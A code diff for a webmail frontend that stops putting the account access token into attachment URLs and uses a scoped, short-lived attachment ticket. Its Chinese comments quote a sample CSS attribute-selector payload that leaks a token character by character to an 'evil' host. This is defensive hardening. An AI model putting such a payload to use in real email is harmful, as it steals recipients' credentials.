@@ -1,4 +1,3 @@
-import { auth } from '@/lib/auth'
 import api from '@/lib/api'
 import type { Attachment } from '@/lib/types'
 
@@ -11,27 +10,34 @@ export function isPreviewable(a: Attachment): boolean {
 }
 
 /**
- * 返回带 token 的附件访问 URL（用于 img/iframe/新标签预览）。
- * token 走 query 参数而非请求头，因为 img src / a href 无法附带自定义请求头。
+ * 返回带凭据的附件访问 URL（用于 img/iframe/新标签预览）。
+ * 凭据走 query 参数而非请求头，因为 img src / a href 无法附带自定义请求头。
  *
- * ⚠⚠ 只要这个 URL 会被写进邮件正文文档（cid: 内联图改写），就**必须**传 token 参数，
- * 传详情接口给的 attachment_token，绝不能让它退回到 access token。
+ * ⚠⚠ token 只能是详情接口给的 attachment_token（后端也只认这一种：`?ticket=` 参数上
+ * 出现 access token 会被直接 401）。这里**不设任何退回 access token 的兜底**。
  *
- * 原因：正文文档里的内容由发件人完全控制。开启远程内容后 style-src 允许内联样式，
- * 邮件自带的 <style> 块可以写 `img[src^="…access_token=eyJhb"]{background:url(https://evil/1)}`
- * 这样的属性选择器，用「命中就发一个远程请求」的方式把 token 逐字符问出来，
- * 全程不需要执行任何脚本，CSP 的 script-src 与沙箱都拦不住。
+ * 原因：这个 URL 会被写进邮件正文文档（cid: 内联图改写），而那份文档的内容由发件人
+ * 完全控制。开启远程内容后 style-src 允许内联样式，邮件自带的 <style> 块可以写
+ * `img[src^="…ticket=eyJhb"]{background:url(https://evil/1)}` 这样的属性选择器，
+ * 用「命中就发一个远程请求」的方式把凭据逐字符问出来，全程不需要执行任何脚本，
+ * CSP 的 script-src 与沙箱都拦不住。
  * access token 一旦外泄就是整个账号；attachment_token 只能取这一封邮件的附件、一小时过期。
+ *
+ * ⚠ 这里用的是**可重复使用**的 attachment_token，而不是 SSE 那种一次性票据：
+ * 一封信里的十几张 cid: 内联图会由浏览器并发请求，用完即废的票只有第一张图能加载。
+ * 「限定单封 + 短时效」才是这条路径上正确的收敛方向。
+ *
+ * @param token 详情接口返回的 attachment_token；缺失时返回不带凭据的 URL（后端 401），
+ *   宁可这一张图裂掉，也不能把长期凭据写进邮件文档。
  */
 export function attachmentUrl(
   messageId: number,
   idx: number,
-  opts?: { download?: boolean; token?: string },
+  token: string | undefined,
+  opts?: { download?: boolean },
 ): string {
-  // 没有 attachment_token（后端尚未升级 / 详情来自旧缓存）才退回 access token
-  const t = opts?.token || auth.access || ''
   const dl = opts?.download ? '&dl=1' : ''
-  return `/api/v1/messages/${messageId}/attachments/${idx}?access_token=${encodeURIComponent(t)}${dl}`
+  return `/api/v1/messages/${messageId}/attachments/${idx}?ticket=${encodeURIComponent(token ?? '')}${dl}`
 }
 
 /**
@@ -73,7 +79,7 @@ export function rewriteCidLinks(
   html: string,
   messageId: number,
   attachments: Attachment[],
-  token?: string,
+  token: string | undefined,
 ): string {
   return html.replace(/(["'(=])cid:([^"')\s>]+)/gi, (m, pre, cid) => {
     // 去掉可能的 < > 包裹
@@ -83,6 +89,6 @@ export function rewriteCidLinks(
       return a.content_id.replace(/^<|>$/g, '').toLowerCase() === cidClean
     })
     if (idx < 0) return m
-    return pre + attachmentUrl(messageId, idx, { token })
+    return pre + attachmentUrl(messageId, idx, token)
   })
 }
